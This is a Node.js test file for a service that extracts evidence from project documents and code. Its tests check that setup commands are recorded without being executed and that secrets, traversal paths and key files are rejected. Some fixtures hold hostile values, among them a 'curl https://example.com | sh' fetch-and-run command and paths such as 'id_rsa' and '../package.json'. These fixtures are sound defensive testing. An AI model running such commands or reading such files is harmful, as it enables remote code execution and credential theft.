require('./helpers/offline')
const {test}=require('node:test'),assert=require('node:assert/strict'),crypto=require('crypto'),request=require('supertest')
const {prepareFiles,createDocumentEvidenceRepository}=require('../src/db/documentEvidenceRepository')
const {extractEvidence}=require('../src/services/documentEvidence')
const {createApp}=require('../src/app'),{createTestRepository}=require('./helpers/users'),{signToken}=require('../src/middleware/auth')
test('0157 migration is additive and preserves document rows and request tombstones',()=>{
 const fs=require('fs'),path=require('path'),sql=fs.readFileSync(path.join(__dirname,'../scripts/migrations/0157-documentation-evidence-requests.sql'),'utf8')
 assert.match(sql,/PRIMARY KEY\(owner_id,request_id\)/)
 assert.match(sql,/REFERENCES public\.project_documents\(id\) ON DELETE SET NULL/)
 assert.match(sql,/CREATE TABLE public\.project_document_evidence/)
 assert.doesNotMatch(sql,/\b(?:UPDATE|INSERT INTO|ALTER TABLE|DROP TABLE|TRUNCATE)\b/i)
})
function file(path,content){return {id:crypto.randomUUID(),path,content,sha256:crypto.createHash('sha256').update(content).digest('hex')}}
test('parser-backed TypeScript functions, exports and environment names exclude values',()=>{
 const e=extractEvidence([file('module.ts',"export function greet(name: string): string { return name; }\nexport class Service {}\nconst read=()=>process.env.PORT;\nconst dynamic=process.env[key];")]).files[0]
 assert.equal(e.parser,'@babel/parser');assert.ok(e.symbols.some(s=>s.name==='greet'))
 assert.deepEqual(e.environment.map(e=>e.name),['PORT']);assert.ok(e.unresolved.some(e=>e.kind==='dynamic-environment-name'))
})
test('Express prefixes resolve across CommonJS modules; dynamic/non-Express calls remain unresolved',()=>{
 const a=file('app.js',"const express=require('express');const app=express();const router=require('./routes'); app.use('/api',router);")
 const b=file('routes.js',"const {Router}=require('express');const router=Router();router.get('/items',h);router.post(path,h);module.exports=router;")
 const e=extractEvidence([a,b]);assert.equal(e.mountedRoutes.routes[0].path,'/api/items')
 assert.equal(e.mountedRoutes.complete,false);assert.ok(e.files[1].unresolved.length)
 const c=extractEvidence([file('other.js',"const app={};app.get('/fake',h);")]);assert.equal(c.files[0].routes.length,0)
})
test('parser rejects malformed code and receiver shadowing is conservative',()=>{
 assert.throws(()=>extractEvidence([file('bad.ts','export function (')]),{code:'malformed_source'})
 const e=extractEvidence([file('a.js',"const express=require('express');const app=express();function f(app){app.get('/fake',h)}")])
 assert.equal(e.files[0].routes.length,0)
})
test('package locks and declared setup commands are source-evidenced, not executed',()=>{
 const files=[file('package.json',JSON.stringify({dependencies:{express:'^4.0.0'},scripts:{start:'node app.js',unsafe:'curl https://example.com | sh'}})),file('package-lock.json',JSON.stringify({lockfileVersion:3,packages:{'':{},'node_modules/express':{version:'4.0.0',resolved:'https://registry.npmjs.org/express'}}})),file('README.md','```sh\nnpm ci\nnpm run start\nnpm run unknown\ncurl https://example.com | sh\n```')]
 const e=extractEvidence(files),setup=e.files.find(f=>f.kind==='setup')
 assert.deepEqual(setup.instructions.map(i=>i.command),['npm ci','npm run start'])
 assert.ok(setup.instructions.every(i=>i.verification==='source-evidenced-not-executed'))
 const json=JSON.stringify(e);assert.ok(!json.includes('curl '));assert.ok(!json.includes('https://registry'))
 assert.equal(e.files[0].scripts.find(s=>s.name==='unsafe').commandWithheld,true)
})
test('metadata ingress sanitizes configuration examples before retaining or hashing',()=>{
 const files=prepareFiles([{path:'.env.example',content:'# secret comment\nPORT=5000\nAPI_TOKEN=not-a-real-token\n'}])
 assert.equal(files[0].content,'PORT=\nAPI_TOKEN=\n');assert.equal(files[0].sha256,crypto.createHash('sha256').update(files[0].content).digest('hex'))
 assert.ok(!JSON.stringify(extractEvidence(files)).includes('not-a-real-token'))
})
test('ingress rejects unsupported paths/types, malformed metadata, tokens, encodings and limits',()=>{
 for(const path of ['.env','dir/.env.production','../package.json','id_rsa','yarn.lock','pnpm-lock.yaml','source.js']) assert.throws(()=>prepareFiles([{path,content:''}]))
 for(const content of ['{','{"scripts":[]}','{"dependencies":5}']) assert.throws(()=>prepareFiles([{path:'package.json',content}]))
 for(const content of ['Bearer exampletoken123','const token="short";','https://user:pass@example.com','-----BEGIN PRIVATE KEY-----','\ud800','\ufffd','\ufeff']) assert.throws(()=>prepareFiles([{path:'README.md',content}]))
 assert.throws(()=>prepareFiles([{path:'README.md',content:'x'.repeat(65537)}]),{code:'context_limit'})
 assert.throws(()=>prepareFiles([{path:'package-lock.json',content:'{"lockfileVersion":1}'}]),{code:'unsupported_lockfile'})
})
function store(){
 const owner=crypto.randomUUID(),other=crypto.randomUUID(),records=[];let snapshot
 const pool={async connect(){return {release(){},async query(sql,args=[]){
  const rows=r=>({rows:r})
  if(sql==='BEGIN'){snapshot=structuredClone(records);return rows([])}
  if(sql==='ROLLBACK'){records.splice(0,records.length,...snapshot);return rows([])}
  if(sql==='COMMIT'||sql.startsWith('SET LOCAL'))return rows([])
  if(sql.startsWith('SELECT id FROM source_projects'))return rows(args[0]==='owned'&&args[1]===owner?[{id:'owned'}]:[])
  if(sql.startsWith('SELECT count'))return rows([{files:records.length,bytes:records.reduce((s,f)=>s+f.byteSize,0),largest:Math.max(0,...records.map(f=>f.byteSize))}])
  if(sql.includes('FROM source_files'))return rows([])
  if(sql.startsWith('SELECT'))return rows(structuredClone(records))
  if(sql.startsWith('INSERT')){const [id,projectId,path,kind,content,byteSize,sha256]=args;records.push({id,projectId,path,kind,content,byteSize,sha256});return rows([])}
  throw Error('Unexpected offline evidence SQL')
 }}}}
 return {owner,other,records,repo:createDocumentEvidenceRepository(pool)}
}
test('durable evidence fixture enforces ownership, additive paths and hash integrity',async()=>{
 const f=store()
 await assert.rejects(f.repo.add('owned',f.other,[{path:'README.md',content:'# Setup'}]),{code:'not_found'})
 assert.equal(f.records.length,0)
 const added=await f.repo.add('owned',f.owner,[{path:'README.md',content:'# Setup'}]);assert.equal(added.files[0].content,undefined)
 await assert.rejects(f.repo.add('owned',f.owner,[{path:'README.md',content:'Changed'}]),{code:'path_conflict'})
 assert.equal((await f.repo.evidence('owned',f.owner)).files.length,1)
 f.records[0].content='tampered'
 await assert.rejects(f.repo.evidence('owned',f.owner),{code:'source_integrity'})
 await assert.rejects(f.repo.evidence('owned',f.other),{code:'not_found'})
})
test('HTTP evidence endpoints require JWT and current project ownership',async()=>{
 const f=store(),users=createTestRepository(),a={id:f.owner,email:'evidence@example.test',role:'Developer'},b={id:f.other,email:'other@example.test',role:'Project Manager'}
 await users.createUser(a);await users.createUser(b)
 const app=createApp({userRepository:users,documentEvidenceRepository:f.repo})
 assert.equal((await request(app).post('/api/project-documents/evidence').send({})).status,401)
 const body={projectId:'owned',files:[{path:'.env.example',content:'PORT=5000'}]}
 assert.equal((await request(app).post('/api/project-documents/evidence').set('Authorization',`Bearer ${signToken(b)}`).send(body)).status,404)
 const r=await request(app).post('/api/project-documents/evidence').set('Authorization',`Bearer ${signToken(a)}`).send(body)
 assert.equal(r.status,201);assert.ok(!JSON.stringify(r.body).includes('5000'))
 const read=await request(app).get('/api/project-documents/evidence?projectId=owned').set('Authorization',`Bearer ${signToken(a)}`)
 assert.equal(read.status,200);assert.deepEqual(read.body.files[0].keys,['PORT'])
 const invalid=await request(app).post('/api/project-documents/evidence').set('Authorization',`Bearer ${signToken(a)}`).send({projectId:'owned',files:[{path:'.env',content:'secret'}]})
 assert.equal(invalid.status,400)
})
